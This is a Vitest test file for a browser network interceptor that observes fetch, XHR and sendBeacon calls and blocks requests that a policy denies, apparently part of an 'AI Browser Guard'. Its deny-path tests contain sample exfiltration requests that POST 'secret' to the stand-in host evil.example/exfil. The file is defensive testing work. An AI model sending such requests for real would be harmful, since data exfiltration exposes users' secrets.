import { describe, it, expect, vi, beforeEach } from 'vitest';
import { installNetworkInterceptor } from './network-interceptor';
import type { NetworkEvent, NetworkRequestMeta } from './network-interceptor';

// We need to mock window.fetch and XMLHttpRequest since we're in Node
let originalFetch: typeof globalThis.fetch;
let originalXHRProto: {
  open: typeof XMLHttpRequest.prototype.open;
};

// Create a minimal XHR mock for Node environment
function createMockXHR(): typeof XMLHttpRequest {
  function MockXHR(this: Record<string, unknown>) {
    this._listeners = new Map<string, Array<{ fn: Function; once: boolean }>>();
  }
  MockXHR.prototype.open = vi.fn();
  MockXHR.prototype.send = vi.fn(function (this: Record<string, unknown>) {
    // Fire loadstart listeners synchronously for test convenience
    const listeners = (this._listeners as Map<string, Array<{ fn: Function; once: boolean }>>)?.get('loadstart') ?? [];
    for (const { fn } of listeners) {
      fn();
    }
  });
  MockXHR.prototype.addEventListener = vi.fn(function (this: Record<string, unknown>, type: string, fn: Function, opts?: { once?: boolean }) {
    const map = this._listeners as Map<string, Array<{ fn: Function; once: boolean }>>;
    if (!map.has(type)) map.set(type, []);
    map.get(type)!.push({ fn, once: opts?.once ?? false });
  });
  return MockXHR as unknown as typeof XMLHttpRequest;
}

beforeEach(() => {
  // Set up fetch mock
  originalFetch = vi.fn(() =>
    Promise.resolve(new Response('ok'))
  ) as unknown as typeof globalThis.fetch;
  (globalThis as Record<string, unknown>).fetch = originalFetch;

  // Set up XHR mock
  if (typeof XMLHttpRequest === 'undefined') {
    (globalThis as Record<string, unknown>).XMLHttpRequest = createMockXHR();
  }
  // Clear accumulated calls so absolute call-count assertions are per-test.
  (XMLHttpRequest.prototype.open as unknown as { mockClear?: () => void }).mockClear?.();
  originalXHRProto = {
    open: XMLHttpRequest.prototype.open,
  };
});

describe('installNetworkInterceptor', () => {
  it('intercepts fetch calls and reports events', async () => {
    const events: NetworkEvent[] = [];
    const cleanup = installNetworkInterceptor((event) => {
      events.push(event);
    });

    try {
      await window.fetch('https://api.example.com/data', { method: 'POST', body: '{"key":"value"}' });

      expect(events).toHaveLength(1);
      expect(events[0].url).toBe('https://api.example.com/data');
      expect(events[0].method).toBe('POST');
      expect(events[0].dataSize).toBeGreaterThan(0);
      expect(events[0].timestamp).toBeTruthy();
      expect(['agent', 'user', 'unknown']).toContain(events[0].initiator);
    } finally {
      cleanup();
    }
  });

  it('intercepts fetch with URL object', async () => {
    const events: NetworkEvent[] = [];
    const cleanup = installNetworkInterceptor((event) => {
      events.push(event);
    });

    try {
      await window.fetch(new URL('https://api.example.com/test'));

      expect(events).toHaveLength(1);
      expect(events[0].url).toBe('https://api.example.com/test');
      expect(events[0].method).toBe('GET');
    } finally {
      cleanup();
    }
  });

  it('restores original fetch on cleanup', async () => {
    const events: NetworkEvent[] = [];
    const cleanup = installNetworkInterceptor((event) => {
      events.push(event);
    });

    // While interceptor is active, events should be captured
    await window.fetch('https://example.com/test1');
    expect(events).toHaveLength(1);

    cleanup();

    // After cleanup, no more events should be captured
    const countBefore = events.length;
    await window.fetch('https://example.com/test2');
    expect(events).toHaveLength(countBefore); // no new events
  });

  it('restores original XHR methods on cleanup', () => {
    const callback = vi.fn();
    const cleanup = installNetworkInterceptor(callback);

    // XHR open should be wrapped (send is no longer wrapped — observed passively)
    expect(XMLHttpRequest.prototype.open).not.toBe(originalXHRProto.open);

    cleanup();

    // XHR should be restored
    expect(XMLHttpRequest.prototype.open).toBe(originalXHRProto.open);
  });

  it('handles fetch with no body (GET request)', async () => {
    const events: NetworkEvent[] = [];
    const cleanup = installNetworkInterceptor((event) => {
      events.push(event);
    });

    try {
      await window.fetch('https://api.example.com/data');

      expect(events).toHaveLength(1);
      expect(events[0].method).toBe('GET');
      expect(events[0].dataSize).toBe(0);
    } finally {
      cleanup();
    }
  });

  it('does not break fetch on callback error', async () => {
    const cleanup = installNetworkInterceptor(() => {
      throw new Error('Callback error');
    });

    try {
      // Should not throw despite callback error
      const response = await window.fetch('https://api.example.com/data');
      expect(response).toBeTruthy();
    } finally {
      cleanup();
    }
  });

  it('intercepts XHR open and send', () => {
    const events: NetworkEvent[] = [];
    const cleanup = installNetworkInterceptor((event) => {
      events.push(event);
    });

    try {
      const xhr = new XMLHttpRequest();
      xhr.open('GET', 'https://api.example.com/xhr-test');
      xhr.send();

      expect(events).toHaveLength(1);
      expect(events[0].url).toBe('https://api.example.com/xhr-test');
      expect(events[0].method).toBe('GET');
    } finally {
      cleanup();
    }
  });

  it('tracks POST method for XHR via passive observation', () => {
    const events: NetworkEvent[] = [];
    const cleanup = installNetworkInterceptor((event) => {
      events.push(event);
    });

    try {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://api.example.com/submit');
      xhr.send('body content here');

      expect(events).toHaveLength(1);
      expect(events[0].method).toBe('POST');
      // Body size is not available from passive loadstart observation
      expect(events[0].dataSize).toBe(0);
    } finally {
      cleanup();
    }
  });

  it('handles string input to fetch', async () => {
    const events: NetworkEvent[] = [];
    const cleanup = installNetworkInterceptor((event) => {
      events.push(event);
    });

    try {
      await window.fetch('https://example.com/page');
      expect(events[0].url).toBe('https://example.com/page');
    } finally {
      cleanup();
    }
  });
});

describe('installNetworkInterceptor — deny path', () => {
  it('rejects a denied fetch and does NOT call the underlying fetch or observe it', async () => {
    const events: NetworkEvent[] = [];
    const underlying = globalThis.fetch as ReturnType<typeof vi.fn>;
    const cleanup = installNetworkInterceptor(
      (event) => events.push(event),
      () => ({ blocked: true, reason: 'network-request blocked by delegation rule' }),
    );

    try {
      await expect(
        window.fetch('https://evil.example/exfil', { method: 'POST', body: 'secret' })
      ).rejects.toThrow(/blocked by AI Browser Guard/); // generic — no rule internals leak to the page
      expect(underlying).not.toHaveBeenCalled(); // request never went out
      expect(events).toHaveLength(0); // a denied request is not observed
    } finally {
      cleanup();
    }
  });

  it('passes the request meta (url/method/initiator) to the decider', async () => {
    const decide = vi.fn((_meta: NetworkRequestMeta) => ({ blocked: false, reason: '' }));
    const cleanup = installNetworkInterceptor(() => {}, decide);

    try {
      await window.fetch('https://api.example.com/x', { method: 'PUT' });
      expect(decide).toHaveBeenCalledTimes(1);
      const meta = decide.mock.calls[0]?.[0];
      expect(meta?.url).toBe('https://api.example.com/x');
      expect(meta?.method).toBe('PUT');
      expect(['agent', 'user', 'unknown']).toContain(meta?.initiator);
    } finally {
      cleanup();
    }
  });

  it('lets an allowed fetch through and still observes it', async () => {
    const events: NetworkEvent[] = [];
    const underlying = globalThis.fetch as ReturnType<typeof vi.fn>;
    const cleanup = installNetworkInterceptor(
      (event) => events.push(event),
      () => ({ blocked: false, reason: '' }),
    );

    try {
      await window.fetch('https://api.example.com/ok');
      expect(underlying).toHaveBeenCalledTimes(1);
      expect(events).toHaveLength(1);
    } finally {
      cleanup();
    }
  });

  it('fails OPEN when the decider throws (never breaks the page network)', async () => {
    const underlying = globalThis.fetch as ReturnType<typeof vi.fn>;
    const cleanup = installNetworkInterceptor(
      () => {},
      () => { throw new Error('policy bug'); },
    );

    try {
      const res = await window.fetch('https://api.example.com/ok');
      expect(res).toBeTruthy();
      expect(underlying).toHaveBeenCalledTimes(1);
    } finally {
      cleanup();
    }
  });

  it('skips the native XHR open() when denied, so the request cannot be sent', () => {
    const events: NetworkEvent[] = [];
    const cleanup = installNetworkInterceptor(
      (event) => events.push(event),
      () => ({ blocked: true, reason: 'blocked' }),
    );

    try {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://evil.example/exfil');
      // The underlying native open() must not have been invoked.
      expect(originalXHRProto.open).not.toHaveBeenCalled();
      // No loadstart observer was attached, so a send() produces no event.
      xhr.send('secret');
      expect(events).toHaveLength(0);
    } finally {
      cleanup();
    }
  });

  it('opens and observes a non-denied XHR normally', () => {
    const events: NetworkEvent[] = [];
    const cleanup = installNetworkInterceptor(
      (event) => events.push(event),
      () => ({ blocked: false, reason: '' }),
    );

    try {
      const xhr = new XMLHttpRequest();
      xhr.open('GET', 'https://api.example.com/ok');
      expect(originalXHRProto.open).toHaveBeenCalledTimes(1);
      xhr.send();
      expect(events).toHaveLength(1);
      expect(events[0].url).toBe('https://api.example.com/ok');
    } finally {
      cleanup();
    }
  });

  // Swap in an isolated fake navigator (the real one may be non-extensible in Node).
  function withFakeNavigator(impl: (...a: unknown[]) => boolean): () => void {
    const desc = Object.getOwnPropertyDescriptor(globalThis, 'navigator');
    Object.defineProperty(globalThis, 'navigator', {
      value: { sendBeacon: impl },
      configurable: true,
      writable: true,
    });
    return () => {
      if (desc) Object.defineProperty(globalThis, 'navigator', desc);
      else delete (globalThis as Record<string, unknown>).navigator;
    };
  }

  it('denies an agent-attributed sendBeacon (returns false, original not called)', () => {
    const original = vi.fn(() => true);
    const restore = withFakeNavigator(original);
    const cleanup = installNetworkInterceptor(() => {}, () => ({ blocked: true, reason: 'blocked' }));

    try {
      const result = navigator.sendBeacon('https://evil.example/exfil', 'secret');
      expect(result).toBe(false); // not queued — the beacon never leaves
      expect(original).not.toHaveBeenCalled();
    } finally {
      cleanup();
      restore();
    }
  });

  it('lets a non-denied sendBeacon through', () => {
    const original = vi.fn(() => true);
    const restore = withFakeNavigator(original);
    const cleanup = installNetworkInterceptor(() => {}, () => ({ blocked: false, reason: '' }));

    try {
      const result = navigator.sendBeacon('https://api.example.com/ok', 'data');
      expect(result).toBe(true);
      expect(original).toHaveBeenCalledTimes(1);
    } finally {
      cleanup();
      restore();
    }
  });
});
